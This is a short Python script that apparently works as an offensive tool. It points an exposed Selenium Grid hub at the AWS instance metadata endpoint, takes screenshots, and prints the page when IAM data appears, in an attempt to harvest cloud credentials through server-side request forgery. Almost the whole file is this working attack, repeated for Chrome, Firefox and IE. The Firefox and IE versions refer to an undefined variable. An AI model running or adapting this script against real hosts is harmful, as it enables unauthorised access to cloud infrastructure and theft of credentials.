from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities


######### CONFIG SECTION ###########
IP = "127.0.0.1"
PORT = "5555"
URL = "http://169.254.169.254/latest/meta-data/"

####################################

def try_chrome(IP,PORT,URL):

	try:
		desired_caps = DesiredCapabilities.CHROME
		grid_url = "http://"+IP+":"+PORT+"/wd/hub"
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.get(URL)
		driver.maximize_window()
		driver.save_screenshot('screenshots_chrome.png')
		print ("[*] Screenshot Saved [*]")
		html_source = driver.page_source
		if "iam" in html_source:
			print ("[*] "+html_source+" [*]")
		driver.quit()
	except:
		print ("[*] Chrome not Avalible On This Server [*]")
	
def try_firefox (IP,PORT,URL):
	
	try:
		desired_caps = DesiredCapabilities.FIREFOX
		grid_url = "http://"+IP+":"+PORT+"/wd/hub"
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.get(URL)
		driver.maximize_window()
		driver.save_screenshot('screenshots_firefox.png')
		print ("[*] Screenshot Saved [*]")
		if "iam" in html_source:
			print ("[*] "+html_source+" [*]")
		driver.quit()
		driver.quit()
	except:
		print ("[*] Firefox not Avalible On This Server [*]")
		
		
		
def try_ie (IP,PORT,URL):
	
	try:
		desired_caps = DesiredCapabilities.IE
		grid_url = "http://"+IP+":"+PORT+"/wd/hub"
		driver = webdriver.Remote(desired_capabilities=desired_caps, command_executor=grid_url)
		driver.get(URL)
		driver.maximize_window()
		driver.save_screenshot('screenshots_ie.png')
		print ("[*] Screenshot Saved [*]")
		if "iam" in html_source:
			print ("[*] "+html_source+" [*]")
		driver.quit()
	except:
		print ("[*] IE not Avalible On This Server [*]")

print ("[*] Trying Firefox [*]")
try_firefox (IP,PORT,URL)
print ("[*] Trying Chrome [*]")
try_chrome(IP,PORT,URL)
print ("[*] Trying IE [*]")
try_ie(IP,PORT,URL)
